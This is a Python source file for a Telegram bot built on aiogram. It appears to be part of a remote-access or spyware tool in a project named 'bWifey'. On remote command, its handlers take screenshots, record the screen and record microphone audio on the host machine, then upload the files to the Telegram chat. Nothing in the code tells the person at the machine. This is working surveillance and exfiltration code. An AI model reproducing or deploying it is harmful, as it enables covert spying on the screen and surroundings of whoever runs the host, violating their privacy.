from start_bot import dp, logger
from aiogram.filters import Command
from aiogram.types import Message, FSInputFile, BufferedInputFile
from aiogram.enums import ChatAction
import pyautogui
from start_bot import bot
import io
from datetime import datetime
import numpy as np
import cv2
import pyaudio
import sys
import wave

@dp.message(Command("screen"))
async def make_screen(message: Message):
	try:
		try:
			await bot.send_message(message.chat.id, "Спроба зробити скріншот")
			screen = pyautogui.screenshot()
			with io.BytesIO() as buffer:
				screen.save(buffer, format="PNG")
				buffer.seek(0)
				await bot.send_chat_action(message.chat.id, ChatAction.UPLOAD_PHOTO)
				await bot.send_photo(message.chat.id, BufferedInputFile(buffer.getvalue(), filename="screenshot.png"))
		except Exception as e:
			try:
				await bot.send_message(message.chat.id, "Помилка")
				await bot.send_message(message.chat.id, str(e))
			except Exception as e:
				logger.error(f"Error in make_screen>Error Notification: {str(e)}")

	except Exception as e:
		try:
			logger.critical(f"GLOBAL ERROR im make_screen function: {str(e)}")
		except:
			pass



@dp.message(Command("screen_video"))
async def make_screen_video(message: Message):
	try:
		try:
			seconds = int(message.text.replace("/screen_video ", ""))
			SCREEN_SIZE = tuple(pyautogui.size())
			fourcc = cv2.VideoWriter_fourcc(*"XVID")
			out = cv2.VideoWriter("bWifey/temp/record.avi", fourcc, 15, (SCREEN_SIZE))
			current_time = datetime.now()
			while (datetime.now() - current_time).seconds < seconds:
				img = pyautogui.screenshot()
				frame = np.array(img)
				frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
				out.write(frame)
			out.release()
			await bot.send_chat_action(message.chat.id, ChatAction.UPLOAD_VIDEO)
			await bot.send_document(message.chat.id, FSInputFile("bWifey/temp/record.avi", filename="record.avi"))

		except Exception as e:
			try:
				await bot.send_message(message.chat.id, "Помилка запису")
				await bot.send_message(message.chat.id, str(e))
			except Exception as e:
				logger.error(f"Error in make_screen_video>Error Notification: {str(e)}")

	except Exception as e:
		try:
			logger.critical(f"GLOBAL ERROR im make_screen_video function: {str(e)}")
		except:
			pass



@dp.message(Command("record_audio"))
async def record_audio(message: Message):
	try: 
		seconds = int(message.text.replace("/record_audio ", ""))
		try:
			CHUNK = 1024
			FORMAT = pyaudio.paInt16
			CHANNELS = 1 if sys.platform == 'darwin' else 2
			RATE = 44100
			RECORD_SECONDS = seconds

			with wave.open("bWifey/temp/record.wav", 'wb') as wf:
				p = pyaudio.PyAudio()
				wf.setnchannels(CHANNELS)
				wf.setsampwidth(p.get_sample_size(FORMAT))
				wf.setframerate(RATE)
				stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True)

				for _ in range(0, RATE // CHUNK * RECORD_SECONDS):
					wf.writeframes(stream.read(CHUNK))

				stream.close()
				p.terminate()

				await bot.send_chat_action(message.chat.id, ChatAction.UPLOAD_VOICE)
				await bot.send_audio(message.chat.id, FSInputFile("bWifey/temp/record.wav", filename="record.wav"))

		except Exception as e:
			try:
				await bot.send_message(message.chat.id, "Помилка запису")
				await bot.send_message(message.chat.id, str(e))
			except Exception as e:
				logger.error(f"Error in record_audio>Error Notification: {str(e)}")
	
	except Exception as e:
		try:
			logger.critical(f"GLOBAL ERROR in record_audio function: {str(e)}")
		except:
			pass